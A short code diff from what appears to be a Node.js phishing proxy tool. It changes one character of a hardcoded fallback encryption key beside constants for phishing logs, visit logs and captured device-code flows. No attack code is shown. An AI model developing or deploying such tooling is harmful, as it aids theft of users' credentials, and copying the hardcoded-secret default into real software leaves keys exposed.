@@ -49,7 +49,7 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "s7GmQpL2rXwN5zVc8yBfJkU3hT9eA0nM";
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "s7GmQpL2rXwN5zVc8yBfJkU3hT9eA0nS";
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
 const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
